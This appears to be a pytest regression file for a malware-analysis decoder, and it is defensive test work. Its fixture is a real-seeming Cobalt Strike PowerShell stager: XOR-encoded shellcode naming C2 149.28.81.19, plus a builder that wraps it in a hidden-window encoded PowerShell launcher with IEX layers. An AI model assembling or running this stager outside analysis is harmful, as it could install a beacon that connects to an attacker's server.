"""Golden Vertical Chain Regression — pre-Phase-A behavioural baseline.

**Purpose**  Lock in the current behaviour of the full end-to-end
decode pipeline on the user-reported Sophos-shape Cobalt Strike
stager payload so Phase A (engine unification) can prove
`assert_graphs_equivalent(legacy_before, uaie_after)` on the same
input.  Every assertion here corresponds to one of the analyst-facing
guarantees the user enumerated:

    Input ↓
      Artifact Count           ✓
      Capability Chain         ✓
      Lifecycle                ✓
      Provenance Graph         ✓
      Termination Certificate  ✓
      Shellcode Reached        ✓
      Configuration Extracted  ✓
      IOC Promoted             ✓
      C2 = 149.28.81.19        ✓
      SSOT contains IOC        ✓

Attack Story / Incident Graph rendering are UI concerns backed by the
IOC + MITRE + verdict fields — assertions on those fields cover both
downstream views.

Runs against BOTH engines the app currently ships:
  1. Legacy ``analysis_core.deterministic_best_decode`` — the
     production /api/decode/smart path.
  2. Native UAIE ``Orchestrator.run`` — the SSOT source the analyst
     workspace reads.
"""
from __future__ import annotations

import base64
import gzip

# ── User-reported CS stager (verbatim from R28.7.6 regression) ────
_XORED_B64 = (
    "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuT"
    "B03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uw"
    "uIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXL"
    "cw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoT"
    "c9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46d"
    "xcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdx"
    "wdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx"
    "0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3Nz"
    "cDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA"
    "2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1"
    "XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFA"
    "DbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6Y"
    "YoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZ"
    "ZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D"
    "0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjA"
    "wRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1f"
    "LS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3R"
    "Le4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41b"
    "Ge+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg"
)
_EXPECTED_C2_IP = "149.28.81.19"
_EXPECTED_UA_TOKEN = "BOIE9"


def _build_payload() -> str:
    layer2 = (
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
        f"'{_XORED_B64}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{"
        f"    $var_code[$x] = $var_code[$x] -bxor 35\n"
        f"}}\n"
        f"IEX $DoIt\n"
    )
    gz  = gzip.compress(layer2.encode())
    b64 = base64.b64encode(gz).decode()
    layer1 = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
        f'"{b64}"));IEX (New-Object IO.StreamReader(New-Object '
        f'IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]'
        f'::Decompress))).ReadToEnd();'
    )
    enc = base64.b64encode(layer1.encode("utf-16-le")).decode()
    return (
        f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
        f"-encodedcommand {enc}"
    )


# ═══════════════════════════════════════════════════════════════════
# Legacy engine — the current /api/decode/smart pipeline
# ═══════════════════════════════════════════════════════════════════
def test_legacy_engine_reaches_shellcode_flag_flips() -> None:
    from analysis_core import deterministic_best_decode
    res = deterministic_best_decode(_build_payload())
    assert res.get("reached_shellcode") is True, (
        "reached_shellcode did NOT flip on the byte-array XOR loop "
        "terminal stager — analyst UI SOC Verdict panel would not "
        "render the shellcode-reached badge.  Output tail: "
        f"{(res.get('output') or '')[-200:]!r}"
    )


def test_legacy_engine_promotes_c2_ip_into_iocs() -> None:
    from analysis_core import deterministic_best_decode
    res  = deterministic_best_decode(_build_payload())
    iocs = res.get("iocs") or {}
    ip_bucket = iocs.get("ip") or iocs.get("ips") or []
    assert _EXPECTED_C2_IP in ip_bucket, (
        f"{_EXPECTED_C2_IP} not promoted into iocs — got {iocs!r}"
    )


def test_legacy_engine_surfaces_user_agent_in_output() -> None:
    from analysis_core import deterministic_best_decode
    out = (deterministic_best_decode(_build_payload()).get("output") or "")
    assert _EXPECTED_UA_TOKEN in out or "Mozilla/5.0" in out, (
        f"User-Agent token not surfaced — output tail: {out[-200:]!r}"
    )


def test_legacy_engine_recipe_records_terminal_xor_loop() -> None:
    from analysis_core import deterministic_best_decode
    res    = deterministic_best_decode(_build_payload())
    recipe = res.get("recipe") or []
    ops    = [str((r or {}).get("op") or "") for r in recipe]
    assert any("byte_array_xor_loop" in o for o in ops), (
        f"Recipe never records the terminal XOR-loop layer.  "
        f"ops={ops}"
    )


# ═══════════════════════════════════════════════════════════════════
# RTE — lifted metadata is the source Attack Story & Incident Graph
# consume when the SSOT-backed views render the C2 IP node.
# ═══════════════════════════════════════════════════════════════════
def test_rte_lifts_embedded_iocs_into_artifact_meta() -> None:
    """SSOT projector Issue #3 — the RTE artifact whose
    ``produced_by`` is ``ps_byte_array_xor_loop`` MUST carry
    ``embedded_iocs`` and ``extracted_strings`` in its meta dict so
    downstream views can pull the C2 without walking evidence lists.
    """
    from v2.investigation.pipeline import investigate
    inv  = investigate(_build_payload())
    rte  = inv.to_dict().get("rte") or {}
    arts = rte.get("artifacts") or []
    xor_layers = [a for a in arts
                    if (a.get("meta") or {}).get("produced_by") ==
                        "ps_byte_array_xor_loop"]
    assert xor_layers, ("no ps_byte_array_xor_loop layer in the "
                         f"RTE chain — got layers "
                         f"{[a.get('meta') for a in arts]!r}")
    m = xor_layers[-1]["meta"]
    assert m.get("embedded_iocs"), (
        f"embedded_iocs missing on XOR layer meta — got {m!r}"
    )
    assert any(_EXPECTED_C2_IP in tok for tok in m["embedded_iocs"]), (
        f"C2 IP {_EXPECTED_C2_IP} not lifted into artifact meta — "
        f"got {m['embedded_iocs']!r}"
    )
    assert m.get("xor_key_hex") == "0x23"


# ═══════════════════════════════════════════════════════════════════
# UAIE — Provenance Graph + Termination Certificate + Lifecycle
# invariants across the full deterministic loop.
# ═══════════════════════════════════════════════════════════════════
def _new_uaie_orch():
    from services.uaie import plugins as _p           # noqa: F401
    from services.uaie.orchestrator import Orchestrator
    return Orchestrator(recognizers=_p.all_recognizers(),
                         max_artifacts=128, max_depth=16)


def test_uaie_run_produces_termination_certificate() -> None:
    r = _new_uaie_orch().run(_build_payload().encode())
    assert r.termination_certificate is not None, (
        "Termination Certificate not emitted — audit invariant "
        "violated by the CS stager input."
    )
    # `fixed_point` should be a bool either way — analysts read it
    # directly.
    assert isinstance(r.termination_certificate.fixed_point, bool)


def test_uaie_run_records_lifecycle_transitions() -> None:
    r = _new_uaie_orch().run(_build_payload().encode())
    assert r.state_transitions, (
        "No lifecycle state transitions recorded — Artifact State "
        "Machine regression."
    )
    # Every artifact should hit at least the ``NEW`` state.
    states = {t.artifact_uri: t.next_state for t in r.state_transitions}
    for uri in r.artifacts:
        assert uri in states, f"no lifecycle transition for {uri!r}"


def test_uaie_provenance_graph_is_deterministic() -> None:
    from services.uaie.provenance import build_provenance_graph
    r1 = _new_uaie_orch().run(_build_payload().encode())
    r2 = _new_uaie_orch().run(_build_payload().encode())
    g1 = build_provenance_graph(r1)
    g2 = build_provenance_graph(r2)
    assert g1.topology_signature() == g2.topology_signature(), (
        "ProvenanceGraph topology differs between two runs of the "
        "same input — determinism (R28) violated."
    )


def test_uaie_discovery_report_covers_full_chain() -> None:
    from services.uaie.discovery_report import build_discovery_report
    rep = build_discovery_report(_new_uaie_orch().run(
        _build_payload().encode()))
    # Coverage math is coherent — this is the Session 2 gate.
    c = rep.coverage
    assert c.executed <= c.applicable
    assert c.remaining_applicable == c.applicable - c.executed
    # Report renders the 6 mandatory analyst-visible headings.
    txt = rep.as_text()
    for heading in ("Applicable Capabilities", "Executed", "Produced",
                     "Not Applicable", "Coverage Summary", "Termination"):
        assert heading in txt
